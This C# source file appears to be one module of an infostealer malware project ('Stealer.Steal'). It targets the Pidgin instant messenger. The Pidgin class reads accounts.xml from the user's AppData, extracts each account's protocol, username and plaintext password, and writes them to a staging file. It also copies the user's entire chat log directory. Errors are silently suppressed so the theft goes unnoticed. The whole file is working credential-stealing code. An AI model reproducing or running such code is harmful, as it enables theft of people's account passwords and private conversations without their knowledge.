using System;
using System.IO;
using System.Text;
using System.Xml;
using Stealer.Steal.Helper;

namespace Stealer.Steal.Target.Messangers;

internal class Pidgin
{
	private static StringBuilder SbTwo = new StringBuilder();

	private static string PidginPath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), ".purple");

	private static void GetLogs(string sSavePath)
	{
		try
		{
			string text = Path.Combine(PidginPath, "logs");
			if (Directory.Exists(text))
			{
				DynamicFiles.CopyDirectory(text, Path.Combine(sSavePath, "chatlogs"));
			}
		}
		catch (Exception)
		{
		}
	}

	private static void GetAccounts(string sSavePath)
	{
		try
		{
			string text = Path.Combine(PidginPath, "accounts.xml");
			if (!File.Exists(text))
			{
				return;
			}
			XmlDocument xmlDocument = new XmlDocument();
			xmlDocument.Load(new XmlTextReader(text));
			if (xmlDocument.DocumentElement != null)
			{
				foreach (XmlNode childNode in xmlDocument.DocumentElement.ChildNodes)
				{
					string innerText = childNode.ChildNodes[0].InnerText;
					string innerText2 = childNode.ChildNodes[1].InnerText;
					string innerText3 = childNode.ChildNodes[2].InnerText;
					if (!string.IsNullOrEmpty(innerText) && !string.IsNullOrEmpty(innerText2) && !string.IsNullOrEmpty(innerText3))
					{
						Counter.Pidgin++;
						SbTwo.AppendLine("Protocol: " + innerText);
						SbTwo.AppendLine("Username: " + innerText2);
						SbTwo.AppendLine("Password: " + innerText3 + "\r\n");
						continue;
					}
					break;
				}
			}
			if (SbTwo.Length > 0)
			{
				DynamicFiles.WriteAllText(Path.Combine(sSavePath, "accounts.txt"), SbTwo.ToString());
			}
		}
		catch
		{
		}
	}

	public static void Start()
	{
		GetAccounts(Path.Combine("Messengers", "Pidgin"));
		GetLogs(Path.Combine("Messengers", "Pidgin"));
	}
}
